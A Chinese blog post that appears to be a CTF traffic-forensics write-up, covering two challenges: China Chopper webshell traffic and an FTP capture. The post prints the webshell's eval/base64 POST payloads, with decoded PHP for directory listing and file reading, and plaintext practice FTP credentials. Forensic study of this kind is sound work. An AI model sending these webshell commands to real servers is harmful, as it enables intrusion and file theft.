<!DOCTYPE html>
<html lang=zh>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="renderer" content="webkit">
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="format-detection" content="telephone=no,email=no,adress=no">
  <!-- Color theme for statusbar -->
  <meta name="theme-color" content="#000000" />
  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
  <meta http-equiv="window-target" content="_top" />
  
  
  <title>CTF-流量分析题1 | Hexo</title>
  <meta name="description" content="CTF-流量分析题1Chopper开文件追踪TCP 第一个包是连接shell的流量 1234567891011121314151617181920POST &#x2F;isg.php HTTP&#x2F;1.1Cache-Control: no-cacheX-Forwarded-For: 10.197.194.76Referer: http:&#x2F;&#x2F;192.168.1.10Content-Type: applicatio">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF-流量分析题1">
<meta property="og:url" content="http://s1eady.top/2019/04/08/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%981/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="CTF-流量分析题1Chopper开文件追踪TCP 第一个包是连接shell的流量 1234567891011121314151617181920POST &#x2F;isg.php HTTP&#x2F;1.1Cache-Control: no-cacheX-Forwarded-For: 10.197.194.76Referer: http:&#x2F;&#x2F;192.168.1.10Content-Type: applicatio">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201017141158783.png">
<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018103640225.png">
<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201018204904668.png">
<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019104532504.png">
<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019104340990.png">
<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019103048789.png">
<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1BC315BA-1A9B-4B6A-889E-2E762B203327.png">
<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019145112551.png">
<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/5231ACC5-8931-48C2-A483-06100814B4CE.png">
<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201019145829154.png">
<meta property="og:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/047CA09E-4574-4E0A-8ED2-D96779F99817.png">
<meta property="article:published_time" content="2019-04-07T20:23:21.000Z">
<meta property="article:modified_time" content="2020-10-20T11:32:55.447Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="CTF-流量分析">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201017141158783.png">
  <!-- Canonical links -->
  <link rel="canonical" href="http://s1eady.top/2019/04/08/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%981/index.html">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png" type="image/x-icon">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  
  
  
<meta name="generator" content="Hexo 5.2.0"></head>


<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
  <div class="slimContent">
    <div class="navbar-header">
      
      
      <div class="profile-block text-center">
        <a id="avatar" href="https://github.com/cofess" target="_blank">
          <img class="img-circle img-rotate" src="/images/steady.jpg" width="200" height="200">
        </a>
        <h2 id="name" class="hidden-xs hidden-sm">果冻</h2>
        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Penetration Testing</h3>
        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> 中国 南京</small>
      </div>
      
      <div class="search" id="search-form-wrap">

    <form class="search-form sidebar-form">
        <div class="input-group">
            <input type="text" class="search-form-input form-control" placeholder="搜索" />
            <span class="input-group-btn">
                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
            </span>
        </div>
    </form>
    <div class="ins-search">
  <div class="ins-search-mask"></div>
  <div class="ins-search-container">
    <div class="ins-input-wrapper">
      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
    </div>
    <div class="ins-section-wrapper">
      <div class="ins-section-container"></div>
    </div>
  </div>
</div>


</div>
      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
    </div>
    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
      <ul class="nav navbar-nav main-nav ">
        
        
        <li class="menu-item menu-item-home">
          <a href="/.">
            
            <i class="icon icon-home-fill"></i>
            
            <span class="menu-title">首页</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-archives">
          <a href="/archives">
            
            <i class="icon icon-archives-fill"></i>
            
            <span class="menu-title">归档</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-categories">
          <a href="/categories">
            
            <i class="icon icon-folder"></i>
            
            <span class="menu-title">分类</span>
          </a>
        </li>
        
        
        <li class="menu-item menu-item-about">
          <a href="/about">
            
            <i class="icon icon-cup-fill"></i>
            
            <span class="menu-title">关于</span>
          </a>
        </li>
        
      </ul>
      
	
    <ul class="social-links">
    	
        <li><a href="/GXA111666" target="_blank" title="VX" data-toggle=tooltip data-placement=top><i class="icon icon-VX"></i></a></li>
        
        <li><a href="/1252195810" target="_blank" title="QQ" data-toggle=tooltip data-placement=top><i class="icon icon-QQ"></i></a></li>
        
        <li><a href="/1252195810@qq.com" target="_blank" title="E-Mail" data-toggle=tooltip data-placement=top><i class="icon icon-E-mail"></i></a></li>
        
        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
        
    </ul>

    </nav>
  </div>
</header>

  
    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    
      <div class="widget">
    <h3 class="widget-title">公告</h3>
    <div class="widget-body">
        <div id="board">
            <div class="content">
                <p>深山夕照深秋雨 一往情深深几许</p>
            </div>
        </div>
    </div>
</div>

    
  </div>
</aside>

  
  
<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
  <div class="slimContent">
    <nav id="toc" class="article-toc">
      <h3 class="toc-title">文章目录</h3>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%981"><span class="toc-number">1.</span> <span class="toc-text">CTF-流量分析题1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chopper"><span class="toc-number">1.1.</span> <span class="toc-text">Chopper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Router"><span class="toc-number">1.2.</span> <span class="toc-text">Router</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SimpleProtocol"><span class="toc-number">1.3.</span> <span class="toc-text">SimpleProtocol</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Backdoor"><span class="toc-number">1.4.</span> <span class="toc-text">Backdoor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Capture-the-Hacker"><span class="toc-number">1.5.</span> <span class="toc-text">Capture the Hacker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#slimple"><span class="toc-number">1.6.</span> <span class="toc-text">slimple</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlinject"><span class="toc-number">1.7.</span> <span class="toc-text">sqlinject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2017%E5%8E%A6%E9%97%A8%E9%82%80%E8%AF%B7%E8%B5%9B-traffic"><span class="toc-number">1.8.</span> <span class="toc-text">2017厦门邀请赛 traffic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2018-%E7%BA%A2%E5%B8%BD%E6%9D%AF-Not-only-Wireshark"><span class="toc-number">1.9.</span> <span class="toc-text">2018 红帽杯 Not only Wireshark</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TRF06-Forever"><span class="toc-number">1.10.</span> <span class="toc-text">TRF06 Forever</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fraud"><span class="toc-number">1.11.</span> <span class="toc-text">Fraud</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TRF09-embarrass"><span class="toc-number">1.12.</span> <span class="toc-text">TRF09 embarrass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#private"><span class="toc-number">1.13.</span> <span class="toc-text">private</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#first-contact"><span class="toc-number">1.14.</span> <span class="toc-text">first-contact</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#voip"><span class="toc-number">1.15.</span> <span class="toc-text">voip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#digital-camouflage"><span class="toc-number">1.16.</span> <span class="toc-text">digital-camouflage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-Big-Deal"><span class="toc-number">1.17.</span> <span class="toc-text">No_Big_Deal</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSL-Sniff"><span class="toc-number">1.18.</span> <span class="toc-text">SSL Sniff</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FTP"><span class="toc-number">1.19.</span> <span class="toc-text">FTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DFA-CCSC-Spring-2020-CTF"><span class="toc-number">1.20.</span> <span class="toc-text">DFA&#x2F;CCSC Spring 2020 CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shell-pcap"><span class="toc-number">1.20.1.</span> <span class="toc-text">shell.pcap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb-pcapng"><span class="toc-number">1.20.2.</span> <span class="toc-text">smb.pcapng</span></a></li></ol></li></ol></li></ol>
    </nav>
  </div>
</aside>

<main class="main" role="main">
  <div class="content">
  <article id="post-CTF-流量分析题1" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
    
    <div class="article-header">
      
        
  
    <h1 class="article-title" itemprop="name">
      CTF-流量分析题1
    </h1>
  

      
      <div class="article-meta">
        <span class="article-date">
    <i class="icon icon-calendar-check"></i>
	<a href="/2019/04/08/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%981/" class="article-date">
	  <time datetime="2019-04-07T20:23:21.000Z" itemprop="datePublished">2019-04-08</time>
	</a>
</span>
        
  <span class="article-category">
    <i class="icon icon-folder"></i>
    <a class="article-category-link" href="/categories/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">CTF-流量分析</a>
  </span>

        
  <span class="article-tag">
    <i class="icon icon-tags"></i>
	<a class="article-tag-link-link" href="/tags/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">CTF-流量分析</a>
  </span>


        

        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2019/04/08/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%981/#comments" class="article-comment-link">评论</a></span>
        
      </div>
    </div>
    <div class="article-entry marked-body" itemprop="articleBody">
      
        <h1 id="CTF-流量分析题1"><a href="#CTF-流量分析题1" class="headerlink" title="CTF-流量分析题1"></a>CTF-流量分析题1</h1><h2 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h2><p>开文件追踪TCP</p>
<p>第一个包是连接shell的流量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /isg.php HTTP/<span class="number">1.1</span></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">X-Forwarded-<span class="keyword">For</span>: <span class="number">10.197</span><span class="number">.194</span><span class="number">.76</span></span><br><span class="line">Referer: http:<span class="comment">//192.168.1.10</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">6.0</span>; Windows NT <span class="number">5.1</span>)</span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.1</span><span class="number">.10</span></span><br><span class="line">Content-Length: <span class="number">692</span></span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line">ISG2014=%<span class="number">40</span><span class="keyword">eval</span>%<span class="number">01</span>%<span class="number">28</span>base64_decode%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>Bz0%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">29</span>%<span class="number">3</span>B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%<span class="number">3</span>D%<span class="number">3</span>DHTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Sun, <span class="number">07</span> Sep <span class="number">2014</span> <span class="number">16</span>:<span class="number">34</span>:<span class="number">08</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.2</span><span class="number">.15</span> (CentOS)</span><br><span class="line">X-Powered-By: PHP/<span class="number">5.3</span><span class="number">.3</span></span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: <span class="number">110</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF<span class="number">-8</span></span><br><span class="line"></span><br><span class="line">-&gt;|/<span class="keyword">var</span>/www/html		Linux Linux <span class="number">2.6</span><span class="number">.32</span><span class="number">-431.23</span><span class="number">.3</span>.el6.x86_64 <span class="comment">#1 SMP Thu Jul 31 17:20:51 UTC 2014 x86_64(apache)|&lt;-</span></span><br></pre></td></tr></table></figure>

<p>第二个包是列目录的操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;isg.php HTTP&#x2F;1.1</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">X-Forwarded-For: 10.197.194.76</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.1.10</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 6.0; Windows NT 5.1)</span><br><span class="line">Host: 192.168.1.10</span><br><span class="line">Content-Length: 734</span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line">ISG2014&#x3D;%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0&#x3D;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1&#x3D;L3Zhci93d3cvaHRtbC8%3DHTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Sun, 07 Sep 2014 16:34:08 GMT</span><br><span class="line">Server: Apache&#x2F;2.2.15 (CentOS)</span><br><span class="line">X-Powered-By: PHP&#x2F;5.3.3</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 295</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line"></span><br><span class="line">-&gt;|..&#x2F;	2014-09-08 00:08:13	4096	0755</span><br><span class="line">css&#x2F;	2014-09-08 00:27:55	4096	0755</span><br><span class="line">.&#x2F;	2014-09-08 00:28:33	4096	0755</span><br><span class="line">images&#x2F;	2014-09-08 00:27:58	4096	0755</span><br><span class="line">upload&#x2F;	2014-09-08 00:28:33	4096	0755</span><br><span class="line">isg.php	2014-09-05 23:04:00	34	0644</span><br><span class="line">index.php	2014-09-08 00:27:48	0	0644</span><br><span class="line">x.tar.gz	2014-09-08 00:17:54	174	0644</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure>

<p>z0参数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;-&gt;|&quot;</span>);;</span><br><span class="line">$D=base64_decode($_POST[<span class="string">&quot;z1&quot;</span>]);</span><br><span class="line">$F=@opendir($D);</span><br><span class="line"><span class="keyword">if</span>($F==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$M=<span class="literal">NULL</span>;</span><br><span class="line">$L=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">while</span>($N=@readdir($F))&#123;</span><br><span class="line">$P=$D.<span class="string">&quot;/&quot;</span>.$N;</span><br><span class="line">$T=@date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>,@filemtime($P));</span><br><span class="line">@$E=substr(base_convert(@fileperms($P),<span class="number">10</span>,<span class="number">8</span>),<span class="number">-4</span>);</span><br><span class="line">$R=<span class="string">&quot;\t&quot;</span>.$T.<span class="string">&quot;\t&quot;</span>.@filesize($P).<span class="string">&quot;\t&quot;</span>.$E.<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(@is_dir($P))</span><br><span class="line">$M.=$N.<span class="string">&quot;/&quot;</span>.$R;</span><br><span class="line"><span class="keyword">else</span> $L.=$N.$R;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $M.$L;</span><br><span class="line">@closedir($F);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;|&lt;-&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>

<p>接受z1传递过来的参数，打开z1目录，并输出时间、文件大小、以及文件权限。</p>
<p>z1参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure>

<p>第三个包是查看文件内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISG2014=%<span class="number">40</span><span class="keyword">eval</span>%<span class="number">01</span>%<span class="number">28</span>base64_decode%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>Bz0%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">29</span>%<span class="number">3</span>B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=%<span class="number">2</span>Fvar%<span class="number">2</span>Fwww%<span class="number">2</span>Fhtml%<span class="number">2</span>Fisg.php</span><br></pre></td></tr></table></figure>

<p>其中z1参数为<code>/var/www/html/isg.php</code></p>
<p>第四个包同理查看文件内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;x.tar.gz</span><br></pre></td></tr></table></figure>

<p>该文件的内容应该就是flag了。这里我们直接使用binwalk分离</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  TRF03 Chopper binwalk -e Chopper&#x2F;Chopper.pcap</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Libpcap capture file, little-endian, version 2.4, Ethernet, snaplen: 65535</span><br><span class="line">7490          0x1D42          gzip compressed data, from Unix, last modified: 2014-09-07 16:17:54</span><br></pre></td></tr></table></figure>

<p>是一个linux的压缩包文件，修改后缀.tar.gz拿到flag。</p>
<h2 id="Router"><a href="#Router" class="headerlink" title="Router"></a>Router</h2><p>ftp名字为sftp，应该是ftp流量分析。追踪tcp发现ftp登录操作，并涉及到一个zip压缩包。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">220</span> (vsFTPd <span class="number">3.0</span><span class="number">.2</span>)</span><br><span class="line">USER forensics</span><br><span class="line"><span class="number">331</span> Please specify the password.</span><br><span class="line">PASS passw0rd</span><br><span class="line"><span class="number">230</span> Login successful.</span><br><span class="line">SYST</span><br><span class="line"><span class="number">215</span> UNIX Type: L8</span><br><span class="line">FEAT</span><br><span class="line"><span class="number">211</span>-Features:</span><br><span class="line"> EPRT</span><br><span class="line"> EPSV</span><br><span class="line"> MDTM</span><br><span class="line"> PASV</span><br><span class="line"> REST STREAM</span><br><span class="line"> SIZE</span><br><span class="line"> TVFS</span><br><span class="line"> UTF8</span><br><span class="line"><span class="number">211</span> End</span><br><span class="line">OPTS UTF8 ON</span><br><span class="line"><span class="number">200</span> Always <span class="keyword">in</span> UTF8 mode.</span><br><span class="line">PWD</span><br><span class="line"><span class="number">257</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">TYPE I</span><br><span class="line"><span class="number">200</span> Switching to Binary mode.</span><br><span class="line">PASV</span><br><span class="line"><span class="number">227</span> Entering Passive Mode (<span class="number">172</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">236</span>,<span class="number">203</span>,<span class="number">159</span>).</span><br><span class="line">CWD /</span><br><span class="line"><span class="number">250</span> Directory successfully changed.</span><br><span class="line">LIST</span><br><span class="line"><span class="number">150</span> Here comes the directory listing.</span><br><span class="line"><span class="number">226</span> Directory send OK.</span><br><span class="line">PASV</span><br><span class="line"><span class="number">227</span> Entering Passive Mode (<span class="number">172</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">236</span>,<span class="number">86</span>,<span class="number">60</span>).</span><br><span class="line">CWD /files/</span><br><span class="line"><span class="number">250</span> Directory successfully changed.</span><br><span class="line">LIST</span><br><span class="line"><span class="number">150</span> Here comes the directory listing.</span><br><span class="line"><span class="number">226</span> Directory send OK.</span><br><span class="line">PASV</span><br><span class="line"><span class="number">227</span> Entering Passive Mode (<span class="number">172</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">236</span>,<span class="number">155</span>,<span class="number">254</span>).</span><br><span class="line">SIZE /files/zip.zip</span><br><span class="line"><span class="number">213</span> <span class="number">12092</span></span><br><span class="line">MDTM /files/zip.zip</span><br><span class="line"><span class="number">213</span> <span class="number">20140913131803</span></span><br><span class="line">RETR /files/zip.zip</span><br><span class="line"><span class="number">150</span> Opening BINARY mode data connection <span class="keyword">for</span> /files/zip.zip (<span class="number">12092</span> bytes).</span><br><span class="line"><span class="number">226</span> Transfer complete.</span><br></pre></td></tr></table></figure>

<p>继续查看每个流发现一个PK头，最底有个flag。</p>
